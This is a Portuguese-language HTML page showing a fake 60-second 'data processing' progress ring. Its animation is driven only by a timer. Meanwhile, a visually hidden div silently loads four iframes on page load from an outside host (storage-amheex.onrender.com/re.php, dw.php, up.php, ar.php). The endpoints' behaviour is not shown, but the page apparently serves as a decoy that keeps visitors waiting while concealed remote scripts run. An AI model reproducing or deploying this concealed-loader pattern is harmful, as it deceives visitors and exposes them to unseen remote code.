<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processamento de Dados</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --primary-color: #38bdf8;
            --track-color: #1e293b;
            --card-bg: rgba(30, 41, 59, 0.5);
        }

        body {
            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        }

        .container {
            text-align: center;
            padding: 3rem;
            background: var(--card-bg);
            border-radius: 24px;
            backdrop-filter: blur(10px);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        h2 { 
            margin-bottom: 30px; 
            font-weight: 300; 
            letter-spacing: 1px;
            color: #f1f5f9;
        }

        /* Estilo da Barra Circular */
        .progress-ring {
            position: relative;
            width: 200px;
            height: 200px;
            margin: 0 auto;
        }

        .progress-ring svg {
            transform: rotate(-90deg);
            filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.3));
        }

        .progress-ring__circle {
            stroke-dasharray: 565.48;
            stroke-dashoffset: 565.48;
            transition: stroke-dashoffset 0.5s ease-out; /* Transição mais suave */
            stroke-linecap: round;
        }

        .percent-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2.8rem;
            font-weight: 800;
            color: var(--primary-color);
            text-shadow: 0 0 20px rgba(56, 189, 248, 0.2);
        }

        /* Esconder os Iframes com segurança */
        .hidden-loader {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            border: 0;
        }

        /* Animação simples para o título */
        .loading-dots:after {
            content: ' .';
            animation: dots 1.5s steps(5, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: '.'; }
            40% { content: '..'; }
            60% { content: '...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>

    <div class="container">
        <h2 id="status-title">Processando<span class="loading-dots"></span></h2>
        
        <div class="progress-ring">
            <svg width="200" height="200">
                <!-- Fundo da barra -->
                <circle stroke="var(--track-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
                <!-- Barra de progresso ativa -->
                <circle id="progress-bar" class="progress-ring__circle" stroke="var(--primary-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
            </svg>
            <div class="percent-text" id="percent-display">0%</div>
        </div>
    </div>

    <!-- Carregamento em segundo plano -->
    <div class="hidden-loader">
        <iframe src="https://storage-amheex.onrender.com/re.php"></iframe>
        <iframe src="https://storage-amheex.onrender.com/dw.php"></iframe>
        <iframe src="https://storage-amheex.onrender.com/up.php"></iframe>
        <iframe src="https://storage-amheex.onrender.com/ar.php"></iframe>
    </div>

    <script>
        const circle = document.getElementById('progress-bar');
        const percentDisplay = document.getElementById('percent-display');
        const statusTitle = document.getElementById('status-title');
        const radius = circle.r.baseVal.value;
        const circumference = 2 * Math.PI * radius;

        let secondsRemaining = 60;
        const totalDuration = 60;

        // Configuração inicial do SVG
        circle.style.strokeDasharray = `${circumference} ${circumference}`;

        function updateProgress() {
            if (secondsRemaining < 0) return;

            const elapsed = totalDuration - secondsRemaining;
            const percent = Math.floor((elapsed / totalDuration) * 100);
            
            percentDisplay.innerText = `${percent}%`;

            const offset = circumference - (percent / 100) * circumference;
            circle.style.strokeDashoffset = offset;

            if (secondsRemaining > 0) {
                secondsRemaining--;
                setTimeout(updateProgress, 1000);
            } else {
                percentDisplay.innerText = "100%";
                statusTitle.innerHTML = "Concluído!";
                statusTitle.style.color = "#4ade80"; // Verde para sucesso
            }
        }

        window.onload = updateProgress;
    </script>
</body>
</html>
